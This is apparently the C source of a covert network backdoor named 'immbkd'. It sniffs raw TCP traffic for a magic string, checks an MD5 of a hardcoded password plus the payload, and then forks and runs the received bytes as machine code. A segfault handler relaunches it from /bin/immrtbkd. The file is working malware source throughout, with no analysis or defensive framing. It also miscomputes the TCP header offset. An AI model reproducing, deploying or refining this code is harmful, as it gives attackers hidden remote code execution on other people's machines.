#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <signal.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>
#include "md5.h"

#define READ_LEN 8096
#define MAGIC "immbkd"
static char *passwd = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
extern char **environ;

/* 
struct tcpheader {
 unsigned short int th_sport;
 unsigned short int th_dport;
 unsigned int th_seq;
 unsigned int th_ack;
 unsigned char th_x2:4, th_off:4;
 unsigned char th_flags;
 unsigned short int th_win;
 unsigned short int th_sum;
 unsigned short int th_urp;
};

struct ipheader {
 unsigned char ip_hl:4, ip_v:4; 
 unsigned char ip_tos;
 unsigned short int ip_len;
 unsigned short int ip_id;
 unsigned short int ip_off;
 unsigned char ip_ttl;
 unsigned char ip_p;
 unsigned short int ip_sum;
 unsigned int ip_src;
 unsigned int ip_dst;
};
*/ 

void handler(int sig)
{
  pid_t pid;
  pid = wait(NULL);
}
void segvhandler(int sig)
{
 
  execle("/bin/immrtbkd", "bin/immrtbkd", NULL, environ);
}

//ether_header
int main(int argc, char **argv)
{
  int fd;
  char buffer[READ_LEN + 1]; /* single packets are usually not bigger than 8192 bytes */
  unsigned char *bufptr = buffer;
  struct iphdr *ip;
  struct tcphdr *tcp;
  unsigned short int dest, src;
  int i, totlen, datalen, ourdatalen;
  char *data, *ourdata, *databuf;
  void (*data_ptr)();
  unsigned  char md5_sig[16];
  unsigned char *our_md5_sig, *md5_buf, *ptr; 
  unsigned int md5len;

#ifdef DEBUG
  printf("Password set to %s", passwd);
#endif
  signal(SIGCHLD, handler);  
 signal(SIGSEGV, segvhandler);  
  fd = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
  if(fd < 0)
  {
    perror("socket");
  }
  /* Buffer starts on iphdr, ethhdr is not read */
  while ((totlen = read (fd, buffer, READ_LEN)) > 0)
  {
    ip = (struct iphdr *)(buffer);
    tcp = (struct tcphdr *)((char *)ip + sizeof(struct tcphdr));
    dest = ntohs(tcp->dest);
    src = ntohs(tcp->source);
    datalen = totlen - sizeof(struct iphdr) - tcp->doff*4;
    if(datalen > 0)
    {
      data = ((char *)tcp + tcp->doff*4);
      data[datalen] = '\0';	/* Null terminate */

#ifdef DEBUG
      printf("Dumping initial 6 bytes of data\n");
      for(i = 0; i < 6; i++)
      {
	printf("%.02x", data[i]);
      }
      printf("\n");
#endif

      if((ourdata = strstr(data, MAGIC)) != NULL)
      {

#ifdef DEBUG
	printf("Found magic string\n");
#endif 

	/* talk to the backdoor baby */
	ourdata = ourdata + strlen(MAGIC);
	memcpy(md5_sig, ourdata, sizeof(md5_sig));
	ourdata = ourdata + sizeof(md5_sig);
	ourdatalen = *((int *)ourdata);

#ifdef DEBUG
	printf("Ourdata len is %d", ourdatalen);
#endif

	ourdata = ourdata + sizeof(int);
	if((databuf = malloc(ourdatalen)) == NULL)
	{
	  perror("malloc");
	  break;
	}

	databuf = memcpy(databuf, ourdata, ourdatalen); /* Not null terminated */
	data_ptr = (void *)databuf;

	/* check md5sum */

	if((md5_buf = malloc(ourdatalen + strlen(passwd) + 1)) == NULL)
	{
	  perror("malloc");
	  break;
	}
	ptr = md5_buf;
	memcpy(ptr, passwd, strlen(passwd));
	memcpy(ptr+strlen(passwd), databuf, ourdatalen);
	ptr = ptr + strlen(passwd) + ourdatalen;
	md5len = ptr - md5_buf;

#ifdef DEBUG
	printf("\nData md5\n");
	for(i = 0; i < ourdatalen + 8 + 3; i++)
	{
	  printf("0x%.02x ", md5_buf[i]);
	}
	printf("\n\n");
	
#endif
	our_md5_sig = MDBuf(md5_buf, md5len);

#ifdef DEBUG
	printf("\nOur md5 is = ");
	for (i = 0; i < 16; i++)
	  printf ("%02x", our_md5_sig[i]);
	printf("\nThere md5 is = ");
	for (i = 0; i < 16; i++)
	  printf ("%02x", md5_sig[i]);
	printf("\n");
#endif
	
	if(memcmp(our_md5_sig, md5_sig, sizeof(md5_sig)) != 0)
	{
	  /* Ignore */
	  free(md5_buf);
	  continue;
	}
	free(md5_buf);
	if(!fork())
	{
	  data_ptr();
	}
      } 
    }
  
    
#ifdef DEBUG
    printf("\n\nConnection from %d to %d and data len %d \n", src, dest,datalen);
    printf("Dumping buffer\n\n");
    for(i = 0; i < totlen; i++)
    {
      printf("%.2x ", *bufptr);
      bufptr++;;
    }
    bufptr = buffer;
#endif
}

return 0;
}
